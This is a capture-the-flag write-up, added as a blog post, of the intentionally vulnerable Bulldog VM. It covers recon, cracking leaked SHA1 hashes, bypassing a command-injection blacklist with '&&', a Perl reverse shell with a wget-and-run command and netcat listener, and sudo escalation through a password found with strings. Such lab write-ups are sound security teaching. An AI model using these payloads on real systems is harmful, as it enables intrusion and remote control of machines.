@@ -1,0 +1,310 @@
+---
+layout: post
+title: "Bulldog writeup"
+subtitle: "~ Walkthrough of Bulldog machine ~"
+date: 2017-10-12
+author: V3ded
+category: CTF
+tags: blog ctf pentesting 
+finished: true
+excerpt_separator: <!--more-->
+---
+
+# Intro
+
+[Bulldog](https://www.vulnhub.com/entry/bulldog-1,211/){:target="_blank"} is an intermediate level machine with supposedly multiple levels of entry made by [Nick](https://twitter.com/@frichette_n){:target="_blank"}. Hopefully you will enjoy your stay and read the whole blog. Let's get started! <!--more-->
+
+***
+
+# Recon
+
+Conveniently the machine's IP *(in my case 192.168.0.199 )* is already displayed on the bootup screen and therefore there is no need to run a host-discovery scan. Skip straight to nmap:
+
+```console
+root@EdgeOfNight:~# nmap -v -A -T5 192.168.0.199
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-10 16:01 BST
+NSE: Loaded 146 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 16:01
+Completed NSE at 16:01, 0.00s elapsed
+Initiating NSE at 16:01
+Completed NSE at 16:01, 0.00s elapsed
+Initiating ARP Ping Scan at 16:01
+Scanning 192.168.0.199 [1 port]
+Completed ARP Ping Scan at 16:01, 0.22s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 16:01
+Completed Parallel DNS resolution of 1 host. at 16:01, 11.01s elapsed
+Initiating SYN Stealth Scan at 16:01
+Scanning 192.168.0.199 [1000 ports]
+Discovered open port 80/tcp on 192.168.0.199
+Discovered open port 23/tcp on 192.168.0.199
+Discovered open port 8080/tcp on 192.168.0.199
+Completed SYN Stealth Scan at 16:01, 2.48s elapsed (1000 total ports)
+Initiating Service scan at 16:01
+Scanning 3 services on 192.168.0.199
+Completed Service scan at 16:01, 6.49s elapsed (3 services on 1 host)
+Initiating OS detection (try #1) against 192.168.0.199
+NSE: Script scanning 192.168.0.199.
+Initiating NSE at 16:01
+Completed NSE at 16:01, 7.13s elapsed
+Initiating NSE at 16:01
+Completed NSE at 16:01, 0.00s elapsed
+Nmap scan report for 192.168.0.199
+Host is up (0.00040s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)
+|   256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)
+|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (EdDSA)
+80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-server-header: WSGIServer/0.1 Python/2.7.12
+|_http-title: Bulldog Industries
+8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-server-header: WSGIServer/0.1 Python/2.7.12
+|_http-title: Bulldog Industries
+MAC Address: 08:00:27:16:1D:5F (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.8
+Uptime guess: 0.007 days (since Tue Oct 10 15:52:18 2017)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.40 ms 192.168.0.199
+
+NSE: Script Post-scanning.
+Initiating NSE at 16:01
+Completed NSE at 16:01, 0.00s elapsed
+Initiating NSE at 16:01
+Completed NSE at 16:01, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.34 seconds
+           Raw packets sent: 1191 (54.980KB) | Rcvd: 1179 (49.576KB)
+```
+
+SSH running on port 23? Odd. 2 web servers, one on 80 and other on 8080? Odd as well. Hopefully we can get something out of this! I launch dirb *(to find hidden directories)*  - `dirb 192.168.0.199` and proceed to manually browse the webpage for visual clues.    
+
+<a href="/img/blog/bulldog/Bulldog01.png" target="_blank"><img class="centerImgLarge" src="/img/blog/bulldog/Bulldog01.png"></a>
+
+Public notice displays:
+
+<a href="/img/blog/bulldog/Bulldog02.png" target="_blank"><img class="centerImgHuge" src="/img/blog/bulldog/Bulldog02.png"></a>
+
+There is a mention of *clam shell* and a *smelly cow* which in my opinion got mistaken for a *reverse shell* and *[dirty c0w](https://dirtycow.ninja/){:target="_blank"} kernel root exploit*. Is that an indirect hint for exploitation in this machine? We'll see. That is all I managed to manually find, even after doing some deeper crawling. Hopefully we gave dirb enough time to run and find some good information.
+
+Dirb:
+```console
+root@EdgeOfNight:~# dirb http://192.168.0.199 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Oct 10 16:52:00 2017
+URL_BASE: http://192.168.0.199/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.0.199/ ----
+==> DIRECTORY: http://192.168.0.199/admin/                                     
+==> DIRECTORY: http://192.168.0.199/dev/                                       
++ http://192.168.0.199/robots.txt (CODE:200|SIZE:1071)                         
+                                                                               
+---- Entering directory: http://192.168.0.199/admin/ ----
+==> DIRECTORY: http://192.168.0.199/admin/auth/                                
+==> DIRECTORY: http://192.168.0.199/admin/login/                               
+==> DIRECTORY: http://192.168.0.199/admin/logout/                              
+                                                                               
+---- Entering directory: http://192.168.0.199/dev/ ----
+==> DIRECTORY: http://192.168.0.199/dev/shell/                                 
+                                                                               
+---- Entering directory: http://192.168.0.199/admin/auth/ ----
+==> DIRECTORY: http://192.168.0.199/admin/auth/group/                          
+==> DIRECTORY: http://192.168.0.199/admin/auth/user/                           
+                                                                               
+---- Entering directory: http://192.168.0.199/admin/login/ ----
+                                                                               
+---- Entering directory: http://192.168.0.199/admin/logout/ ----
+                                                                               
+---- Entering directory: http://192.168.0.199/dev/shell/ ----
+                                                                               
+---- Entering directory: http://192.168.0.199/admin/auth/group/ ----
+(!) WARNING: NOT_FOUND[] not stable, unable to determine correct URLs {30X}.
+    (Try using FineTunning: '-f')
+                                                                               
+---- Entering directory: http://192.168.0.199/admin/auth/user/ ----
+(!) WARNING: NOT_FOUND[] not stable, unable to determine correct URLs {30X}.
+    (Try using FineTunning: '-f')
+                                                                               
+-----------------
+END_TIME: Tue Oct 10 16:54:12 2017
+DOWNLOADED: 32284 - FOUND: 1
+root@EdgeOfNight:~# 
+```
+
+Duh... Quite a lot to go through. Let's pick some directories of interest and see what they have to show. For the start I went with **/dev/**, **/dev/shell/** and **/admin/**. 
+
+**/dev/** presents us with a webpage 
+
+<a href="/img/blog/bulldog/Bulldog03.png" target="_blank"><img class="centerImgHuge" src="/img/blog/bulldog/Bulldog03.png"></a>
+
+which was supposed to stay hidden from public? That's a bit suspicious. I quickly reviewed the web source and couldn't believe my eyes. Take a look for yourself. 
+
+{% highlight html %}
+<!--Need these password hashes for testing. Django's default is too complex-->
+	<!--We'll remove these in prod. It's not like a hacker can do anything with a hash-->
+	Team Lead: alan@bulldogindustries.com<br><!--6515229daf8dbdc8b89fed2e60f107433da5f2cb-->
+	Back-up Team Lead: william@bulldogindustries.com<br><br><!--38882f3b81f8f2bc47d9f3119155b05f954892fb-->
+	Front End: malik@bulldogindustries.com<br><!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279-->
+	Front End: kevin@bulldogindustries.com<br><br><!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9-->
+	Back End: ashley@bulldogindustries.com<br><!--553d917a396414ab99785694afd51df3a8a8a3e0-->
+	Back End: nick@bulldogindustries.com<br><br><!--ddf45997a7e18a25ad5f5cf222da64814dd060d5-->
+	Database: sarah@bulldogindustries.com<br><!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e-->
+{% endhighlight %}
+
+***
+
+# Exploitation
+     
+Storing password hashes inside web source via hidden comments? Nice try. I analyze the hashes using `hash-identifier`, save them in a file and proceed to crack them with `John the Ripper` using a wordlist of personal preference - [rockyou.txt](https://wiki.skullsecurity.org/Passwords){:target="_blank"}.
+
+```console
+root@EdgeOfNight:~# john --wordlist=/root/Wordlists/rockyou.txt --format=raw-sha1 /root/Desktop/hashes.txt 
+Using default input encoding: UTF-8
+Loaded 7 password hashes with no different salts (Raw-SHA1 [SHA1 128/128 AVX 4x])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bulldog          (nick)
+bulldoglover     (sarah)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+`--wordlist= - specifies a path to wordlist`
+
+`--format=  - specifies which format the hashes use, in our case sha1`
+
+`hashes.txt - text file with stored hashes to crack` 
+
+All we need to find now is a way to login and use the cracked credentials. Onto the next directory **/dev/shell/**!
+
+<a href="/img/blog/bulldog/Bulldog04.png" target="_blank"><img class="centerImgHuge" src="/img/blog/bulldog/Bulldog04.png"></a>
+
+No cigar. We need to authenticate first. But where? Maybe we will be able to do so in **/admin/** directory? 
+
+<a href="/img/blog/bulldog/Bulldog05.png" target="_blank"><img class="centerImgHuge" src="/img/blog/bulldog/Bulldog05.png"></a>
+
+Indeed we are! Log in using `sarah:bulldoglover` or `nick:bulldog` credentials and see what we get.
+
+<a href="/img/blog/bulldog/Bulldog06.png" target="_blank"><img class="centerImgHuge" src="/img/blog/bulldog/Bulldog06.png"></a>
+
+A dead end from the interface. Not having enough privileges, I do not think we can do much. I've spent almost 20 minutes trying to see what I can do within the admin panel and only then realized my stupid mistake. Remember the **/dev/shell/** directory which required authentication before accessing it? Why won't we try again and see what it shows now?
+
+<a href="/img/blog/bulldog/Bulldog08.png" target="_blank"><img class="centerImgHuge" src="/img/blog/bulldog/Bulldog08.png"></a>
+
+Wooho! Possible [command injection](https://www.owasp.org/index.php/Command_Injection){:target="_blank"}? Of course! Similar vulnerability was described in my previous [Kioptrix2 blog](/ctf/kioptrix2.html){:target="_blank"}, so there won't be any explaining here. After some digging around I noticed that `;` is blacklisted and results into this message:
+
+<a href="/img/blog/bulldog/Bulldog09.png" target="_blank"><img class="centerImgHuge" src="/img/blog/bulldog/Bulldog09.png"></a>
+
+Interesting... Luckily, there are many bypasses for such simple blacklist. For example using encoding (didn't work this time) or some other alternatives such as `&&` (AND operator). All in all, `&&` successfully bypasses the blacklist and gives us the ability to enter any command of our choosing. Wonderful.
+
+Proof:
+<a href="/img/blog/bulldog/Bulldog10.png" target="_blank"><img class="centerImgHuge" src="/img/blog/bulldog/Bulldog10.png"></a>
+   
+Time to get a sweet shell. This writeup is *metesploit-free* which means we will depend on manual exploitation and reverse connection rather than using msfvenom & handler. Sorry!
+
+1. Make a perl file in our webroot (/var/www/html/)
+2. Put perl reverse shell payload into our file (look below)
+3. Start our apache2 (*/etc/init.d/apache2 start*) or python SimpleHTTPServer
+4. Make the victim download our malicious file via wget from the server & run it.
+
+[Perl shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}:
+{% highlight perl %}
+
+use Socket;$i="192.168.0.213";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
+
+{% endhighlight %}
+
+```
+192.168.0.213 - machine for reverse connection (in this case my kali)
+1234          - port to connect back to` 
+```
+
+We launch netcat listener - `nc -lvp 1234`, download and run the perl file on victim machine using: `pwd && wget 192.168.0.213/shell.pl && perl shell.pl`. *wget* retrieves the file from our webserver and *perl* compiles + runs it. 
+
+<a href="/img/blog/bulldog/Bulldog11.png" target="_blank"> <img class="centerImgLarge" src="/img/blog/bulldog/Bulldog11.png"></a>
+
+Easy! Time for some privilege escalation.
+
+***
+
+# Escalating privileges from django to root
+From doing a `whoami` or `id` command we can see that our shell is running under django user with limited privileges. Escalation is needed. I checked some common directories such as **/var/html/**, **/tmp**, **/etc/**, but got no results. Not finding any system misconfigurations I shift to **/home/** where two folders are present. *Django* (ours) and *bulldogadmin*. *buldogadmin* has a hidden file in its home directory which can be seen using `ls -la` (list all). 
+
+<a href="/img/blog/bulldog/Bulldog12.png" target="_blank"><img class="centerImgMedium" src="/img/blog/bulldog/Bulldog12.png"></a>
+
+Luckily our django user has required read privileges for the folder which will (eventually) lead to the main compromise. Two more files are present - *customPermissionApp* and *note*. *note* is a read only file that describes purpose of the app within the directory. For the sake of simplicity I won't include it here *(It's too long.)*. Now our next file is quite an interesting one. We can't edit or execute it, however readonly permissions are assigned. To get a general idea of how the program behaves I `objdump` it and run `strings`. `strings customPermissionApp` presents us with a beautiful list, and maybe a password.
+
+Output:
+```console                  
+######Continues######
+UH-H
+SUPERultH
+imatePASH
+SWORDyouH
+CANTget
+dH34%(
+AWAVA
+AUATL
+[]A\A]A^A_
+Please enter a valid username to use root privileges
+	Usage: ./customPermissionApp <username>
+sudo su root
+;*3$"
+GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
+crtstuff.c
+######Continues######
+```
+`sudo su root` tells us that the hidden password will probably be used for sudo operation. Make sure to keep that in mind. Now, can you see any pattern? It all comes down to your own imagination and luck. Just try connecting words together and see if you can get a valid password to work with sudo. My attempts included:
+
+* SUPERultimatePASSWORD
+* YOUCANTGETSUPERULTIMATEPASSWORD
+* youCANTgetSUPERultimatePASHSWORD
+* SUPERultimatePASSWORDyouCANTget
+* CANTgetultimateSWORD
+* CANTGETgetultimateSWORD
+* youCANTgetultimatePASSWORD
+
+> Note: before doing this you might have to spawn a TTY shell 
+
+*TTY shell command:* `python -c 'import pty; pty.spawn("/bin/sh")'`
+
+A bit later *(1 hour)*, I manage to guess the correct password! `SUPERultimatePASSWORDyouCANTget`. 
+
+<a href="/img/blog/bulldog/Bulldog13.png" target="_blank"><img class="centerImgMedium" src="/img/blog/bulldog/Bulldog13.png"></a>
+
+### Box has been rooted, congratulations! Go and get the flag!
+
+***
+
+# Conclusion
+
+This VM was awesome! Altough not very hard, I enjoyed it non the less. Always feels good to root a box. Only one question remains... Are there really multiple ways in? I don't know... Go and find for yourself! I only got this one :). As always if you have any questions feel free to [contact](/about/){:target="_blank"} me any time or leave a comment. 
+
+~V3
